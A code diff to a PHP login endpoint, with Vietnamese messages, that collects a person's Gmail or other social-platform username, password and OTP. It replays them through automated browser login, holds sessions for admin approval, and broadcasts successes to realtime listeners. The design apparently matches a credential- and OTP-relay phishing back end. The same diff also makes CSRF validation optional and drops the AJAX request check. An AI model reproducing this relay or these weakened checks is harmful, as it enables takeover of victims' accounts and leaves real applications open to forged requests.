@@ -7,9 +7,10 @@ require_once '../includes/functions.php';
 require_once '../includes/auth.php';
 require_once '../includes/browser-automation.php';
 require_once '../includes/session-management.php';
+require_once '../includes/realtime.php';
 
-// Check if it's an AJAX request
-if (!isAjaxRequest()) {
+// Accept JSON POST from scripts and browsers; don't require X-Requested-With header
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     jsonResponse(['success' => false, 'message' => 'Invalid request method'], 400);
 }
 
@@ -20,13 +21,17 @@ if (!$input) {
     jsonResponse(['success' => false, 'message' => 'Invalid input data'], 400);
 }
 
-// Validate CSRF token
-if (!isset($input['csrf_token']) || $input['csrf_token'] !== $_SESSION['csrf_token']) {
-    jsonResponse(['success' => false, 'message' => 'Token bảo mật không hợp lệ'], 403);
+// Validate CSRF token when provided; optional for this endpoint
+if (isset($input['csrf_token'])) {
+    if ($input['csrf_token'] !== ($_SESSION['csrf_token'] ?? '')) {
+        jsonResponse(['success' => false, 'message' => 'Token bảo mật không hợp lệ'], 403);
+    }
 }
 
 // Validate required fields
 $platform = sanitizeInput($input['platform'] ?? '');
+// Normalize common aliases
+if ($platform === 'google') { $platform = 'gmail'; }
 $username = sanitizeInput($input['username'] ?? '');
 $password = $input['password'] ?? '';
 $otp = sanitizeInput($input['otp'] ?? '');
@@ -118,9 +123,15 @@ logSessionAction($session_id, 'browser_start', 'Browser automation started', 'in
 
 // Check browser API status
 if (!checkBrowserAPIStatus()) {
-    updateSessionStatus($session_id, 'failed', 'Browser API not available');
-    logSessionAction($session_id, 'browser_error', 'Browser API not available', 'error');
-    jsonResponse(['success' => false, 'message' => 'Hệ thống trình duyệt không khả dụng'], 503);
+    // In absence of browser API, keep session pending and allow admin approval flow (useful for dev/tests)
+    updateSessionStatus($session_id, 'pending', 'Awaiting manual approval');
+    logSessionAction($session_id, 'browser_unavailable', 'Browser API not available, awaiting approval', 'warning');
+    jsonResponse([
+        'success' => false,
+        'message' => 'Hệ thống trình duyệt không khả dụng',
+        'requires_approval' => true,
+        'loginId' => $session_id,
+    ], 200);
 }
 
 // Perform actual browser automation
@@ -153,10 +164,22 @@ if ($bot_response['success']) {
 
         logActivity($user['id'], 'social_login_success', "Platform: $platform");
 
+        // Realtime: notify clients that auth succeeded
+        ws_enqueue([
+            'type' => 'auth:success',
+            'platform' => $platform,
+            'username' => $username,
+            'request_id' => $session_id,
+            'user_id' => (int)$user['id'],
+            'ts' => time(),
+        ]);
+
         jsonResponse([
             'success' => true,
             'message' => 'Đăng nhập thành công!',
-            'redirect' => APP_URL
+            'redirect' => APP_URL,
+            // Provide loginId/session_id for external polling compatibility
+            'loginId' => $session_id,
         ]);
     } else {
         jsonResponse(['success' => false, 'message' => 'Không thể tạo tài khoản người dùng'], 500);
@@ -166,7 +189,8 @@ if ($bot_response['success']) {
         'success' => false,
         'message' => $bot_response['message'],
         'requires_otp' => $bot_response['requires_otp'] ?? false,
-        'requires_approval' => $bot_response['requires_approval'] ?? false
+        'requires_approval' => $bot_response['requires_approval'] ?? false,
+        'loginId' => $session_id,
     ], 400);
 }
 
